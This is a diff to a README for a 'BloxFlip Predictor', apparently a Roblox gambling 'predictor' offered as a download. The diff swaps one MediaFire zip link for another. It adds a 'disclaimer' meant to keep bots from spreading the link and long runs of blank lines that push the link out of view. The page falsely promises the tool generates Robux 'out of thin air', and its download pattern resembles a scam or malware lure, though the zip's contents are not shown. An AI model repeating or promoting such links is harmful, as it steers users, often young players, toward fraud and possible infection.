@@ -28,7 +28,32 @@ This project is licensed under the Apache 2.0 License, meaning you can use it an
 Have a blast with BloxFlip Predictor, and let the predictor generate robux out of thin air! 😄🎉
 
 .......................................................................
-https://www.mediafire.com/file/b094y5ss8ydtiz2/fard_predictor.zip/file
+(https://www.mediafire.com/file/8ff6mqgm1iu3vgg/fard+predictor.zip/file)
 ESCLAIMER SO NO BOT CAN SPREAD THE CODE
 
-https://www.mediafire.com/file/b094y5ss8ydtiz2/fard_predictor.zip/file
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+(https://www.mediafire.com/file/8ff6mqgm1iu3vgg/fard+predictor.zip/file)https://www.mediafire.com/file/8ff6mqgm1iu3vgg/fard+predictor.zip/file
